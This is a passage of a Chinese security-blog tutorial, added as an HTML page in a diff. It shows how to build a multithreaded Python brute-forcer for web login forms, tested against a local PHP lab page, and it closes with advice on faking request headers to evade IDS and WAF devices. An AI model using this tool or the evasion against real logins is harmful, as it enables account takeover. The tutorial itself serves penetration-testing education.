@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>在线密码破解工具开发 - T0x1c</title>
+
+  
+    <meta name="description" content="当我们进行在线密码破解时，使用 BurpSuite 以及 wfuzz 足以应对大部分网站应用场景。但是在遇到一些特殊情况时我们还是需要自己来开发密码爆破工具，本文将介绍如何使用Python开发一款简单的密码爆破工具。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="在线密码破解工具开发">
+<meta property="og:url" content="https://toxic80l.github.io/post/1f68479/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="当我们进行在线密码破解时，使用 BurpSuite 以及 wfuzz 足以应对大部分网站应用场景。但是在遇到一些特殊情况时我们还是需要自己来开发密码爆破工具，本文将介绍如何使用Python开发一款简单的密码爆破工具。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://toxic80l.github.io/post/1f68479/%E6%88%AA%E5%B1%8F2022-04-09%20%E4%B8%8B%E5%8D%8811.19.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/1f68479/%E6%88%AA%E5%B1%8F2022-04-09%20%E4%B8%8B%E5%8D%8811.26.00.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/1f68479/%E6%88%AA%E5%B1%8F2022-04-09%20%E4%B8%8B%E5%8D%8811.33.50.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/1f68479/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8A%E5%8D%8812.34.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/1f68479/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8A%E5%8D%881.27.21.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/1f68479/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8A%E5%8D%881.34.39.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/1f68479/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8A%E5%8D%881.39.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/1f68479/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8A%E5%8D%881.42.17.png">
+<meta property="article:published_time" content="2022-04-09T17:47:54.000Z">
+<meta property="article:modified_time" content="2022-04-11T20:47:36.001Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="python">
+<meta property="article:tag" content="密码破解">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://toxic80l.github.io/post/1f68479/%E6%88%AA%E5%B1%8F2022-04-09%20%E4%B8%8B%E5%8D%8811.19.53.png">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E8%83%8C%E6%99%AF%E4%BB%8B%E7%BB%8D"><span class="toc-text">0x01 背景介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-text">密码破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python"><span class="toc-text">Python</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">0x02 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91"><span class="toc-text">0x03 工具开发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEoptparse%E6%A8%A1%E5%9D%97"><span class="toc-text">配置optparse模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4payload"><span class="toc-text">确认payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%89%AB%E6%8F%8F"><span class="toc-text">多线程扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E4%B8%8E%E4%BC%98%E5%8C%96"><span class="toc-text">测试与优化</span></a></li></ol></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/">工具开发</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-04-09T17:47:54.000Z">2022-04-10</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>在线密码破解工具开发</span></h1>
+<p>当我们进行在线密码破解时，使用 BurpSuite 以及 wfuzz 足以应对大部分网站应用场景。但是在遇到一些特殊情况时我们还是需要自己来开发密码爆破工具，本文将介绍如何使用Python开发一款简单的密码爆破工具。<span id="more"></span></p>
+<h2 id="0x01-背景介绍"><a href="#0x01-背景介绍" class="headerlink" title="0x01 背景介绍"></a>0x01 背景介绍</h2><h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><p>记得有大佬曾经说过：一个系统的突破往往是从弱口令开始，为了拿到弱口令我们就需要了解密码破解技术。密码破解主要分为离线密码破解和在线密码破解。</p>
+<p>在平时渗透时我们通常遇到的就是在线密码破解，破解对象包括各类系统服务以及各种网站应用，当我们面对rdp、ftp、ssh等服务，一般情况下可使用 hydra、超级弱口令爆破工具进行破解；而假如面对的是网站应用，最常用到的就是 BurpSuite、wfuzz。</p>
+<p>离线破解主要出现在后渗透阶段，在系统中存在各种加密的哈希值，借助 hashcat、john 等破解工具则能够有效地帮助我们完成密码破解，遇到实在无法破解的密文我们还可以放入在线破解网站进行解密。</p>
+<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>Python是一种简单易学，功能强大的编程语言，它有高效率的高层数据结构，简单而有效地实现面向对象编程。Python简洁的语法和对动态输入的支持，再加上解释性语言的本质，使得它在大多数平台上的许多领域都是一个理想的脚本语言，特别适用于快速的应用程序开发。</p>
+<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>我在 macOS 下使用环境搭建工具为 MAMP，环境语言为 PHP。没有 mac 的同学可在 Windows 下可使用 phpstudy 代替即可。MAMP 默认开放8888端口，访问后出现如下界面说明环境开启成功。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/1f68479/%E6%88%AA%E5%B1%8F2022-04-09%20%E4%B8%8B%E5%8D%8811.19.53.png" alt="截屏2022-04-09 下午11.19.53"></p>
+<p>源代码以POST方式传递账号密码，主要用于测试密码爆破，具体代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$con</span> = mysqli_connect(<span class="string">&quot;localhost:8889&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Fail: &quot;</span>.mysql_connect_error();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$submit</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$submit</span> == <span class="string">&quot;submit&quot;</span>)&#123;</span><br><span class="line">	<span class="variable">$result</span> = mysqli_query(<span class="variable">$con</span>,<span class="string">&quot;select * from users where `username`=&#x27;&quot;</span>.addslashes(<span class="variable">$username</span>).<span class="string">&quot;&#x27; and `password`=&#x27;&quot;</span>.addslashes(<span class="variable">$password</span>).<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;login success&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;login failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>为了配合密码破解在数据库中创建<code>users</code>表并存入一些账号密码<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/1f68479/%E6%88%AA%E5%B1%8F2022-04-09%20%E4%B8%8B%E5%8D%8811.26.00.png" alt="截屏2022-04-09 下午11.26.00"></p>
+<p>使用 Python 进行测试并输入正确的账号密码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8888/python_test/brute/brute_submit.php&quot;</span></span><br><span class="line">r = requests.post(url, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span>, <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;submit&quot;</span>&#125;, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>成功返回<code>login success</code>说明环境搭建成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/1f68479/%E6%88%AA%E5%B1%8F2022-04-09%20%E4%B8%8B%E5%8D%8811.33.50.png" alt="截屏2022-04-09 下午11.33.50"></p>
+<h2 id="0x03-工具开发"><a href="#0x03-工具开发" class="headerlink" title="0x03 工具开发"></a>0x03 工具开发</h2><h3 id="配置optparse模块"><a href="#配置optparse模块" class="headerlink" title="配置optparse模块"></a>配置optparse模块</h3><p>首先我们使用 Python 自带的 OptParse 模块定制程序的参数选项控制，基本用法如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、导入OptionParser类并新建对象OptionParser()</span><br><span class="line"><span class="number">2</span>、添加选项: add_option(…)</span><br><span class="line"><span class="number">3</span>、参数解析: parse_args()</span><br></pre></td></tr></table></figure>
+
+<p>在 add_option() 中可配置如下参数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">dest: 决定解析后取值时的属性名</span><br><span class="line"><span class="built_in">type</span>: 选项的值类型，默认类型是字符串</span><br><span class="line"><span class="built_in">help</span>: 选项中的帮助信息</span><br><span class="line">metavar: 显示到 <span class="built_in">help</span> 中选项的默认值</span><br><span class="line">action: 用于控制对选项和参数的处理，可设置为以下几种字符串:</span><br><span class="line"> - <span class="string">&quot;store&quot;</span>: 储存值到 dest 指定的属性，强制要求后面提供参数</span><br><span class="line"> - <span class="string">&quot;store_true&quot;</span>: 当使用该选项时后面的 dest 将设置为 true, 不跟参数</span><br><span class="line"> - <span class="string">&quot;store_false&quot;</span>: 当使用该选项时后面的 dest 将设置为 false，常配合另一个 <span class="string">&quot;store_true&quot;</span> 的选项使用同一个 dest 时使用，不跟参数</span><br><span class="line"> - <span class="string">&quot;append&quot;</span>: 储存值到 dest 指定的属性并且是以数组的形式, 必须跟参数</span><br><span class="line"> - <span class="string">&quot;store_const&quot;</span>: 用来存储参数为 const 设置的值到 dest 指定的属性当中，常用于 dest 为同名<span class="number">2</span>个以上选项时的处理，不跟参数</span><br><span class="line"> - <span class="string">&quot;append_const&quot;</span>: 用来存储参数为 const 设置的数组到 dest 指定的属性当中，不跟参数</span><br><span class="line"> - <span class="string">&quot;count&quot;</span>: 使用后将给储存值到 dest 指定的属性值加<span class="number">1</span>,可以统计参数中出现次数，不跟参数</span><br><span class="line"> - <span class="string">&quot;callback&quot;</span>: 后面指定回调函数名(不加括号)，会将相应opt和args传给回调函数</span><br><span class="line"> - <span class="string">&quot;help&quot;</span>, <span class="string">&quot;version&quot;</span>: 对应为帮助和版本，要另外自己设计时使用</span><br></pre></td></tr></table></figure>
+
+<p>有了以上知识的了解，我们可为爆破工具配置对应的参数选项，主要包括请求地址、账号字典、密码字典以及进程。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"></span><br><span class="line">parser = optparse.OptionParser()</span><br><span class="line">parser.usage = <span class="string">&quot;web_brute.py -s url -u user_file -p pass_file -t num&quot;</span></span><br><span class="line">parser.add_option(<span class="string">&quot;-s&quot;</span>, <span class="string">&quot;--site&quot;</span>, dest=<span class="string">&quot;website&quot;</span>, metavar=<span class="string">&quot;url&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;website to test&quot;</span>, action=<span class="string">&quot;store&quot;</span>, <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>)</span><br><span class="line">parser.add_option(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--userfile&quot;</span>, dest=<span class="string">&quot;userfile&quot;</span>, metavar=<span class="string">&quot;FILE&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;username from file&quot;</span>, action=<span class="string">&quot;store&quot;</span>, <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>)</span><br><span class="line">parser.add_option(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--passfile&quot;</span>, dest=<span class="string">&quot;passfile&quot;</span>, metavar=<span class="string">&quot;FILE&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;password from file&quot;</span>, action=<span class="string">&quot;store&quot;</span>, <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>)</span><br><span class="line">parser.add_option(<span class="string">&quot;-t&quot;</span>, <span class="string">&quot;--threads&quot;</span>, dest=<span class="string">&quot;threads&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;number of threads&quot;</span>, action=<span class="string">&quot;store&quot;</span>, <span class="built_in">type</span>=<span class="string">&quot;int&quot;</span>)</span><br><span class="line"></span><br><span class="line">(options, args) = parser.parse_args()</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>-h</code>命令查看输出的帮助信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/1f68479/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8A%E5%8D%8812.34.44.png" alt="截屏2022-04-10 上午12.34.44"></p>
+<h3 id="确认payload"><a href="#确认payload" class="headerlink" title="确认payload"></a>确认payload</h3><p>密码字典和线程主要用于控制 payload 请求，线程决定并发的 payload 请求数，而密码决定具体的 payload 请求内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入参数选项</span></span><br><span class="line">website = options.website</span><br><span class="line">threads = options.threads</span><br><span class="line">user_dict = options.userfile</span><br><span class="line">pass_dic = options.passfile</span><br><span class="line"></span><br><span class="line">pass_list = []</span><br><span class="line"><span class="comment"># 打开密码字典</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(pass_dic) <span class="keyword">as</span> f:</span><br><span class="line">    temp_list = f.readlines()</span><br><span class="line">    temp_threads_list = []</span><br><span class="line">    <span class="comment"># 使用临时列表的项数除以线程数确定每一个线程中的项数</span></span><br><span class="line">    num = <span class="built_in">len</span>(temp_list)</span><br><span class="line">    result = num/threads</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 选择floor向下取整</span></span><br><span class="line">    result_num = math.floor(result)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 根据项数分配 payload</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> temp_list:</span><br><span class="line">        flag = flag + <span class="number">1</span></span><br><span class="line">        temp_threads_list.append(line.strip())</span><br><span class="line">        <span class="keyword">if</span> flag == result_num:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            pass_list.append(temp_threads_list)</span><br><span class="line">            temp_threads_list = []</span><br><span class="line">            </span><br><span class="line">    <span class="comment"># 如果存在余数需添加多余项</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> temp_threads_list:</span><br><span class="line">        pass_list[threads-<span class="number">1</span>].append(line)</span><br></pre></td></tr></table></figure>
+
+<h3 id="多线程扫描"><a href="#多线程扫描" class="headerlink" title="多线程扫描"></a>多线程扫描</h3><p>多线程扫描需导入 threading、requests 模块，从字典中获取用户以及密码作为请求参数进行扫描，我们可根据返回长度来判断登陆是否成功</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">payload</span>):</span></span><br><span class="line">    user = payload[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">    pass_list = payload[<span class="string">&quot;pass_list&quot;</span>]</span><br><span class="line">    <span class="comment"># 遍历密码发送请求</span></span><br><span class="line">    <span class="keyword">for</span> password <span class="keyword">in</span> pass_list:</span><br><span class="line">        r = requests.post(url=website, data=&#123;<span class="string">&quot;username&quot;</span>: user, <span class="string">&quot;password&quot;</span>: password, <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;submit&quot;</span>&#125;)</span><br><span class="line">        <span class="comment"># 打印扫描结果</span></span><br><span class="line">        <span class="built_in">print</span>(user + <span class="string">&quot; : &quot;</span> + password + <span class="string">&quot; length=&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(r.text)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">threads_list = []</span><br><span class="line"><span class="comment"># 打开账号字典</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(user_dict) <span class="keyword">as</span> f:</span><br><span class="line">    user_dict = f.readlines()</span><br><span class="line">    <span class="comment"># 确定payload</span></span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> user_dict:</span><br><span class="line">        <span class="keyword">for</span> pass_line <span class="keyword">in</span> pass_list:</span><br><span class="line">            payload = &#123;<span class="string">&quot;username&quot;</span>: user.strip(), <span class="string">&quot;pass_list&quot;</span>: pass_line&#125;</span><br><span class="line">            threads_list.append(threading.Thread(target=scan, args=(payload,)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动线程</span></span><br><span class="line"><span class="keyword">for</span> thread <span class="keyword">in</span> threads_list:</span><br><span class="line">    thread.start()</span><br></pre></td></tr></table></figure>
+
+<h3 id="测试与优化"><a href="#测试与优化" class="headerlink" title="测试与优化"></a>测试与优化</h3><p>使用以上代码对目标进行测试，查看扫描效果</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 web_brute.py -s http://127.0.0.1:8888/python_test/brute/brute_submit.php -u username.txt -p password.txt -t 4</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/1f68479/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8A%E5%8D%881.27.21.png" alt="截屏2022-04-10 上午1.27.21"></p>
+<p>结果虽然能够完成对目标的测试并成功获取不同的返回值，但是一旦账号密码足够多的话我们很难从一堆扫描结果中找到登陆成功的账号密码，因此我们可定义 test 类作为参考，使用一个错误的返回值进行对比并输出最终的扫描结果</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def test():</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1:8888/python_test/brute/brute_submit.php&quot;</span></span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;mac&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;mac&quot;</span>, <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;submit&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> len(r.text)</span><br><span class="line"></span><br><span class="line">def scan(paylaod):</span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">for</span> password in pass_list:</span><br><span class="line">            r = requests.post(url=website, data=&#123;<span class="string">&quot;username&quot;</span>: user, <span class="string">&quot;password&quot;</span>: password, <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;submit&quot;</span>&#125;,)</span><br><span class="line">            <span class="keyword">if</span> len(r.text) != test():</span><br><span class="line">                <span class="keyword">print</span>(user + <span class="string">&quot;:&quot;</span> + password + <span class="string">&quot; login success&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>再次进行测试，返回结果只显示登录成功的账号密码以及扫描结果<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/1f68479/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8A%E5%8D%881.34.39.png" alt="截屏2022-04-10 上午1.34.39"></p>
+<p>但是这其中还存在一个问题：使用 requests 库会在请求头中设置默认的<code>User-agent</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/1f68479/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8A%E5%8D%881.39.41.png" alt="截屏2022-04-10 上午1.39.41"></p>
+<p>为了躲避 IDS、WAF 等防御设备，我们可以定制请求头为正常的浏览器请求</p>
